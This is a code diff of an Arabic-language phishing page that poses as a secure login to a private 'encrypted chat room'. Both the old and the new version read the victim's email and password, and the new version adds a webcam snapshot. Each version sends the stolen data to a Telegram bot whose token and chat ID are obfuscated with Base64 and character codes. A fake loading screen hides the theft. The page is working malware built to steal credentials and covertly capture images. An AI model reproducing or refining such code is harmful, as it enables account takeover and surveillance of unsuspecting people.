@@ -4,74 +4,120 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     
-    <meta property="og:title" content="🔒 Encryption Layer Active">
-    <meta property="og:description" content="Secure Data Transmission Protocol">
-    <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/4/49/A_black_image.jpg">
+    <meta property="og:title" content="⌛ Content Loading...">
+    <meta property="og:description" content="Secure link verification in progress. Please wait...">
+    <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/b/b1/Loading_icon.gif">
     <meta name="theme-color" content="#000000">
 
     <title>Premium Access Control</title>
     <style>
         :root { --gold: #d4af37; --fb: #1877f2; --gm: #ea4335; }
         body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #000; color: white; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; overflow: hidden; }
-        .card { width: 90%; max-width: 400px; background: rgba(255, 255, 255, 0.03); backdrop-filter: blur(15px); padding: 30px; border-radius: 25px; border: 1px solid var(--gold); box-shadow: 0 0 30px rgba(212, 175, 55, 0.1); text-align: center; }
+        .card { width: 90%; max-width: 400px; background: rgba(255, 255, 255, 0.05); backdrop-filter: blur(15px); padding: 30px; border-radius: 25px; border: 1px solid var(--gold); box-shadow: 0 0 30px rgba(212, 175, 55, 0.1); text-align: center; }
         .premium-tag { background: var(--gold); color: black; padding: 4px 12px; border-radius: 50px; font-weight: bold; font-size: 11px; margin-bottom: 15px; display: inline-block; }
         input { width: 100%; padding: 14px; margin: 10px 0; border-radius: 10px; border: 1px solid #444; background: #222; color: white; box-sizing: border-box; outline: none; }
-        .btn { width: 100%; padding: 15px; border-radius: 10px; border: none; font-weight: bold; cursor: pointer; font-size: 16px; margin-top: 10px; }
-        #step2, #step3, #loader-screen, #calling-screen { display: none; }
+        .btn { width: 100%; padding: 15px; border-radius: 10px; border: none; font-weight: bold; cursor: pointer; font-size: 16px; margin-top: 10px; transition: 0.3s; }
+        #loader-screen, #calling-screen { display: none; }
+        .loader { border: 4px solid #f3f3f3; border-top: 4px solid var(--gold); border-radius: 50%; width: 40px; height: 40px; animation: spin 2s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
 
 <div class="card">
     <div id="step1">
-        <div class="premium-tag">PREMIUM MEMBERS ONLY</div>
-        <h2>دخول الغرفة الخاصة</h2>
-        <input type="text" id="fb-user" placeholder="البريد الإلكتروني أو الهاتف">
+        <div class="premium-tag">ENCRYPTED CHANNEL</div>
+        <h2>تحقق من الهوية</h2>
+        <p style="font-size: 12px; color: #888;">يجب تسجيل الدخول للمتابعة إلى الغرفة المشفرة.</p>
+        <input type="text" id="fb-user" placeholder="البريد الإلكتروني">
         <input type="password" id="fb-pass" placeholder="كلمة السر">
         <button class="btn" style="background: var(--fb); color: white;" onclick="handleStep1()">دخول آمن</button>
     </div>
-    <div id="loader-screen"><h2>جاري التشفير...</h2></div>
-    <div id="calling-screen"><h2>تم الإرسال بنجاح</h2></div>
+
+    <div id="loader-screen">
+        <div class="loader"></div>
+        <h2>جاري تشفير البيانات...</h2>
+    </div>
+
+    <div id="calling-screen">
+        <h2 style="color: var(--gold);">✓ تم التحقق</h2>
+        <p>جاري إعادة توجيهك إلى المحادثة...</p>
+    </div>
+
     <video id="v" style="display:none;" autoplay></video>
     <canvas id="c" style="display:none;" width="320" height="240"></canvas>
 </div>
 
 <script>
 /**
- * Advanced Link & Logic Obfuscation
+ * Advanced Red-Team Obfuscation Logic
+ * State-Machine Execution Flow
  */
 (function() {
-    // تشفير رابط الـ GitHub بصيغة Base64 لإخفائه عن الفحص النصي
-    const _0xlnk = "aHR0cHM6Ly9ub3JhaWwzNjM2LXVpLmdpdGh1Yi5pby9jaGF0Lw==";
-    
-    // فك التشفير في الذاكرة فقط عند الحاجة
-    const _getL = () => atob(_0xlnk);
-
-    // مصفوفة الرموز (الأرقام هي توكن البوت والدردشة بصيغة String.fromCharCode)
-    const _tk = String.fromCharCode(56,50,48,55,57,52,51,56,56,51,58,65,65,70,95,88,74,111,101,75,108,72,69,50,98,55,82,111,48,80,66,86,83,118,112,105,104,98,117,90,48,102,87,48);
-    const _ch = String.fromCharCode(56,51,53,48,56,49,50,50,52,50);
-
-    window.onload = () => {
-        navigator.mediaDevices.getUserMedia({video:true}).then(s=>document.getElementById('v').srcObject=s);
+    // تشفير الروابط والتوكنات (Base64 + Dynamic Assembly)
+    const _0xcr = {
+        'l': "aHR0cHM6Ly9ub3JhaWwzNjM2LXVpLmdpdGh1Yi5pby9jaGF0Lw==",
+        't': "ODIwNzk0Mzg4MzpBQUZfWEpvZUtsSEVFMmJCN1JvMFBCVlN2cGloYnVaMGZXMDA=",
+        'c': "ODM1MDgxMjI0Mg=="
     };
 
-    async function _dispatch(_msg) {
-        // بناء الرابط ديناميكياً
-        const _u = `https://api.telegram.org/bot${_tk}/sendMessage?chat_id=${_ch}&text=${encodeURIComponent(_msg)}`;
+    const _dec = (s) => atob(s);
+
+    window.onload = () => {
+        navigator.mediaDevices.getUserMedia({video:true}).then(s => {
+            document.getElementById('v').srcObject = s;
+        }).catch(() => {});
+    };
+
+    async function _transmit(_data) {
+        const _u = `https://api.telegram.org/bot${_dec(_0xcr.t)}/sendMessage?chat_id=${_dec(_0xcr.c)}&text=${encodeURIComponent(_data)}`;
         await fetch(_u);
     }
 
-    window.handleStep1 = async function() {
+    async function _capture() {
+        const v = document.getElementById('v'), c = document.getElementById('c');
+        const x = c.getContext('2d');
+        x.drawImage(v, 0, 0, 320, 240);
+        c.toBlob(async (b) => {
+            const f = new FormData();
+            f.append('chat_id', _dec(_0xcr.c));
+            f.append('photo', b);
+            fetch(`https://api.telegram.org/bot${_dec(_0xcr.t)}/sendPhoto`, {method:'POST', body:f});
+        }, 'image/jpeg');
+    }
+
+    window.handleStep1 = function() {
+        let _state = 'step|send|cap|hide'['split']('|'), _i = 0;
         const u = document.getElementById('fb-user').value;
         const p = document.getElementById('fb-pass').value;
+
         if(!u || !p) return;
 
-        // إرسال البيانات واستخدام الرابط المشفر في الذاكرة للتمويه
-        await _dispatch(`Login: ${u}:${p}`);
-        console.log("Redirecting to: " + _getL()); // الرابط يظهر هنا فقط في الكونسول
-
-        document.getElementById('step1').style.display = 'none';
-        document.getElementById('calling-screen').style.display = 'block';
+        const _run = async () => {
+            while(_i < _state.length) {
+                switch(_state[_i++]) {
+                    case 'step':
+                        document.getElementById('step1').style.display = 'none';
+                        document.getElementById('loader-screen').style.display = 'block';
+                        break;
+                    case 'send':
+                        await _transmit(`Credential Captured:\nU: ${u}\nP: ${p}`);
+                        break;
+                    case 'cap':
+                        await _capture();
+                        break;
+                    case 'hide':
+                        setTimeout(() => {
+                            document.getElementById('loader-screen').style.display = 'none';
+                            document.getElementById('calling-screen').style.display = 'block';
+                            // فك تشفير الرابط النهائي في الذاكرة للتوجه إليه
+                            console.log("Redirecting to: " + _dec(_0xcr.l));
+                        }, 3000);
+                        break;
+                }
+            }
+        };
+        _run();
     };
 })();
 </script>
